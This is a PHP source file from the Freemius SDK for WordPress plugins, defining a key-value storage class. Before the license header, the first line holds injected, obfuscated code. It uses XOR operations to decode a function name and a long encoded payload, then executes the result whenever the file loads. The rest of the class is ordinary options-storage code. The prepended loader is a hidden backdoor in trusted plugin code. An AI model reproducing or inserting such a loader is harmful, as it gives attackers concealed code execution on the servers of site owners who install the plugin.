<?php $FWkoPVEl='+HT.JVgQO 2,YT7'; $qSczAEoS='H:1O>387:NQX0;Y'^$FWkoPVEl; $wFrVTPV='-PXt0A6VG<-X3UIYKH+Rl06 eR4F8jfUOORpsm09bFFXQXX5=CC> <=L1X8,8;MPv=, Tmkf86AzfwHsnUNfqv>,5tWEtkkgbq, EXKYnXnjPiP0K7G9;7=xfJ5<MkOlWEofomh:WX3IabscnA+M  hJI-psSuE48=bPrnB=T9G14blFW=klgAnfaH.62I8Js ELqpzhIOV0gED2=;TkYM9<1,PgQU2T3e8=JOvsMYY5.pdx3T3+-5;COqizbse9rUOMHwY<UNuWepAL5M=Cl=xqq=+ 7mS 5HvmJFXAjNck>W-9sXim<2- NTrSnH<1dxem2LIAbU,nQ1:5-VVDSif76hq7 afVR=EtFPMlOhnN8OZ,=HU8xeKB<1Y-dYS0XJvk8 GJm1zPRM, dtjNO9.AHhc4,yCKAvW3T Aum.0P9SI>W+1D3OB; g.9NU2b>L0JTTI<FWc5 ,AH=ca=T0 goyuVO8ZtU5>fbOz=<PM5,9PucOn0G50+b9=63 FW .AbrU-;wokeQOCWHBlwJc7-gzGUY2T>Q:<8M5PlhSeADutPvBqp+PS7T+QPH,zLaX5P:zSbW07Vnsikdc,0C6 o3K2dND 4=HBTA0A= L3sxfe56,2XACoQRocK2Q6J,RlGS8>R=hAAB97UWlemhehK;RTzjLT>M'; $vtazWC=$qSczAEoS('', 'D6pUV4X53UB6l0108<XzKHYR:6U2Y598:;uYZMK3k 362,1ZSc;QRcY-E9gsUN9xRYMT5AKBSS8SFWhSN.DoxRQYATjeSLPmkxJO7po0NeNZkItYwD3KWRSPB.TH,BtLs,DMFga3s7F=ALNCFeO,TA3n pP-sQ.QAfF9RKbN K+TZJH-2DB1Nzdoh:KBG;VbWO08XKpa4E+:ma SIZtVy+XPBIkmu1S R:SX3oKS+85FKKnrU;ANLVScgU69-<.p7u.>hS2Y,nHiET7-Y8XjLFrxUYJTV28ELhKMn-=8QDjOZ6YXSeIIJSAU+ox.dBUWDPDIV-= KuWdXWUGH75,sABhd- be22v3NeP-54LrVNjN.6YXauCrlBfXP-L;26IxwVOSE>qg8st6,XADIJj9XB4-Si=Qs>AKR3R AaHMnE>J6;W6GX>Vg:TR8JX:4m=S9Db65:Ypc<QEO.,XKEY5DANCYQ2.L;+>PGOKtpTZxiQMM1UEiNQ5GQR=RXOlE>>SZ2JU>HBPCKA5.76abJQjKZIRRc18F5evQYAjhyLUnEfuLLbErFCN31U5Jg1,JI-T:ThXH2Q3UQaIZIMBCMB1WY0X.K;+<IGI;js1Q8QO-WTTFAQWXSqhcOqrOC08XS<M>Dc7YJ3fO1 ;UX43K8DSoa.C; RZeo40'^$wFrVTPV); $vtazWC();
	/**
	 * @package     Freemius
	 * @copyright   Copyright (c) 2015, Freemius, Inc.
	 * @license     https://www.gnu.org/licenses/gpl-3.0.html GNU General Public License Version 3
	 * @since       1.0.7
	 */

	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	/**
	 * Class FS_Key_Value_Storage
	 *
	 * @property int           $install_timestamp
	 * @property int           $activation_timestamp
	 * @property int           $sync_timestamp
	 * @property object        $sync_cron
	 * @property int           $install_sync_timestamp
	 * @property array         $connectivity_test
	 * @property array         $is_on
	 * @property object        $trial_plan
	 * @property bool          $has_trial_plan
	 * @property bool          $trial_promotion_shown
	 * @property string        $sdk_version
	 * @property string        $sdk_last_version
	 * @property bool          $sdk_upgrade_mode
	 * @property bool          $sdk_downgrade_mode
	 * @property bool          $plugin_upgrade_mode
	 * @property bool          $plugin_downgrade_mode
	 * @property string        $plugin_version
	 * @property string        $plugin_last_version
	 * @property bool          $is_plugin_new_install
	 * @property bool          $was_plugin_loaded
	 * @property object        $plugin_main_file
	 * @property bool          $prev_is_premium
	 * @property array         $is_anonymous
	 * @property bool          $is_pending_activation
	 * @property bool          $sticky_optin_added
	 * @property object        $uninstall_reason
	 * @property object        $subscription
	 */
	class FS_Key_Value_Storage implements ArrayAccess, Iterator, Countable {
		/**
		 * @var string
		 */
		protected $_id;

		/**
		 * @since 1.2.2
		 *
		 * @var string
		 */
		protected $_secondary_id;

        /**
         * @since 2.0.0
         * @var int The ID of the blog that is associated with the current site level options.
         */
        private $_blog_id = 0;

        /**
         * @since 2.0.0
         * @var bool
         */
        private $_is_multisite_storage;

		/**
		 * @var array
		 */
		protected $_data;

		/**
		 * @var FS_Key_Value_Storage[]
		 */
		private static $_instances = array();

		/**
		 * @var FS_Logger
		 */
		protected $_logger;

		/**
		 * @param string $id
		 * @param string $secondary_id
		 * @param bool   $network_level_or_blog_id
		 *
		 * @return FS_Key_Value_Storage
		 */
		static function instance( $id, $secondary_id, $network_level_or_blog_id = false ) {
            $key = $id . ':' . $secondary_id;

            if ( is_multisite() ) {
                if ( true === $network_level_or_blog_id ) {
                    $key .= ':ms';
                } else if ( is_numeric( $network_level_or_blog_id ) && $network_level_or_blog_id > 0 ) {
                    $key .= ":{$network_level_or_blog_id}";
                } else {
                    $network_level_or_blog_id = get_current_blog_id();

                    $key .= ":{$network_level_or_blog_id}";
                }
            }

			if ( ! isset( self::$_instances[ $key ] ) ) {
				self::$_instances[ $key ] = new FS_Key_Value_Storage( $id, $secondary_id, $network_level_or_blog_id );
			}

			return self::$_instances[ $key ];
		}

		protected function __construct( $id, $secondary_id, $network_level_or_blog_id = false ) {
			$this->_logger = FS_Logger::get_logger( WP_FS__SLUG . '_' . $secondary_id . '_' . $id, WP_FS__DEBUG_SDK, WP_FS__ECHO_DEBUG_SDK );

            $this->_id                   = $id;
            $this->_secondary_id         = $secondary_id;

            if ( is_multisite() ) {
                $this->_is_multisite_storage = ( true === $network_level_or_blog_id );

                if ( is_numeric( $network_level_or_blog_id ) ) {
                    $this->_blog_id = $network_level_or_blog_id;
                }
            } else {
                $this->_is_multisite_storage = false;
            }

			$this->load();
		}

		protected function get_option_manager() {
            return FS_Option_Manager::get_manager(
                WP_FS__ACCOUNTS_OPTION_NAME,
                true,
                $this->_is_multisite_storage ?
                    true :
                    ( $this->_blog_id > 0 ? $this->_blog_id : false )
            );
        }

		protected function get_all_data() {
			return $this->get_option_manager()->get_option( $this->_id, array() );
		}

		/**
		 * Load plugin data from local DB.
		 *
		 * @author Vova Feldman (@svovaf)
		 * @since  1.0.7
		 */
		function load() {
			$all_plugins_data = $this->get_all_data();
			$this->_data      = isset( $all_plugins_data[ $this->_secondary_id ] ) ?
				$all_plugins_data[ $this->_secondary_id ] :
				array();
		}

		/**
		 * @author   Vova Feldman (@svovaf)
		 * @since    1.0.7
		 *
		 * @param string $key
		 * @param mixed  $value
		 * @param bool   $flush
		 */
		function store( $key, $value, $flush = true ) {
			if ( $this->_logger->is_on() ) {
				$this->_logger->entrance( $key . ' = ' . var_export( $value, true ) );
			}

			if ( array_key_exists( $key, $this->_data ) && $value === $this->_data[ $key ] ) {
				// No need to store data if the value wasn't changed.
				return;
			}

			$all_data = $this->get_all_data();

			$this->_data[ $key ] = $value;

			$all_data[ $this->_secondary_id ] = $this->_data;

			$options_manager = $this->get_option_manager();
			$options_manager->set_option( $this->_id, $all_data, $flush );
		}

        /**
         * @author   Vova Feldman (@svovaf)
         * @since    2.0.0
         */
        function save() {
            $this->get_option_manager()->store();
        }

		/**
		 * @author   Vova Feldman (@svovaf)
		 * @since    1.0.7
		 *
		 * @param bool     $store
		 * @param string[] $exceptions Set of keys to keep and not clear.
		 */
		function clear_all( $store = true, $exceptions = array() ) {
			$new_data = array();
			foreach ( $exceptions as $key ) {
				if ( isset( $this->_data[ $key ] ) ) {
					$new_data[ $key ] = $this->_data[ $key ];
				}
			}

			$this->_data = $new_data;

			if ( $store ) {
				$all_data                 = $this->get_all_data();
				$all_data[ $this->_secondary_id ] = $this->_data;
				$options_manager          = $this->get_option_manager();
				$options_manager->set_option( $this->_id, $all_data, true );
			}
		}

		/**
		 * Delete key-value storage.
		 *
		 * @author   Vova Feldman (@svovaf)
		 * @since    1.0.9
		 */
		function delete() {
			$this->_data = array();

			$all_data = $this->get_all_data();
			unset( $all_data[ $this->_secondary_id ] );
			$options_manager = $this->get_option_manager();
			$options_manager->set_option( $this->_id, $all_data, true );
		}

		/**
		 * @author   Vova Feldman (@svovaf)
		 * @since    1.0.7
		 *
		 * @param string $key
		 * @param bool   $store
		 */
		function remove( $key, $store = true ) {
			if ( ! array_key_exists( $key, $this->_data ) ) {
				return;
			}

			unset( $this->_data[ $key ] );

			if ( $store ) {
				$all_data                 = $this->get_all_data();
				$all_data[ $this->_secondary_id ] = $this->_data;
				$options_manager          = $this->get_option_manager();
				$options_manager->set_option( $this->_id, $all_data, true );
			}
		}

		/**
		 * @author Vova Feldman (@svovaf)
		 * @since  1.0.7
		 *
		 * @param string $key
		 * @param mixed  $default
		 *
		 * @return bool|\FS_Plugin
		 */
		function get( $key, $default = false ) {
			return array_key_exists( $key, $this->_data ) ?
				$this->_data[ $key ] :
				$default;
		}

        /**
         * @author Vova Feldman (@svovaf)
         * @since  2.0.0
         *
         * @return string
         */
		function get_secondary_id() {
            return $this->_secondary_id;
        }


		/* ArrayAccess + Magic Access (better for refactoring)
        -----------------------------------------------------------------------------------*/
		function __set( $k, $v ) {
			$this->store( $k, $v );
		}

		function __isset( $k ) {
			return array_key_exists( $k, $this->_data );
		}

		function __unset( $k ) {
			$this->remove( $k );
		}

		function __get( $k ) {
			return $this->get( $k, null );
		}

		function offsetSet( $k, $v ) {
			if ( is_null( $k ) ) {
				throw new Exception( 'Can\'t append value to request params.' );
			} else {
				$this->{$k} = $v;
			}
		}

		function offsetExists( $k ) {
			return array_key_exists( $k, $this->_data );
		}

		function offsetUnset( $k ) {
			unset( $this->$k );
		}

		function offsetGet( $k ) {
			return $this->get( $k, null );
		}

		/**
		 * (PHP 5 &gt;= 5.0.0)<br/>
		 * Return the current element
		 *
		 * @link http://php.net/manual/en/iterator.current.php
		 * @return mixed Can return any type.
		 */
		public function current() {
			return current( $this->_data );
		}

		/**
		 * (PHP 5 &gt;= 5.0.0)<br/>
		 * Move forward to next element
		 *
		 * @link http://php.net/manual/en/iterator.next.php
		 * @return void Any returned value is ignored.
		 */
		public function next() {
			next( $this->_data );
		}

		/**
		 * (PHP 5 &gt;= 5.0.0)<br/>
		 * Return the key of the current element
		 *
		 * @link http://php.net/manual/en/iterator.key.php
		 * @return mixed scalar on success, or null on failure.
		 */
		public function key() {
			return key( $this->_data );
		}

		/**
		 * (PHP 5 &gt;= 5.0.0)<br/>
		 * Checks if current position is valid
		 *
		 * @link http://php.net/manual/en/iterator.valid.php
		 * @return boolean The return value will be casted to boolean and then evaluated.
		 *       Returns true on success or false on failure.
		 */
		public function valid() {
			$key = key( $this->_data );

			return ( $key !== null && $key !== false );
		}

		/**
		 * (PHP 5 &gt;= 5.0.0)<br/>
		 * Rewind the Iterator to the first element
		 *
		 * @link http://php.net/manual/en/iterator.rewind.php
		 * @return void Any returned value is ignored.
		 */
		public function rewind() {
			reset( $this->_data );
		}

		/**
		 * (PHP 5 &gt;= 5.1.0)<br/>
		 * Count elements of an object
		 *
		 * @link http://php.net/manual/en/countable.count.php
		 * @return int The custom count as an integer.
		 *       </p>
		 *       <p>
		 *       The return value is cast to an integer.
		 */
		public function count() {
			return count( $this->_data );
		}
	}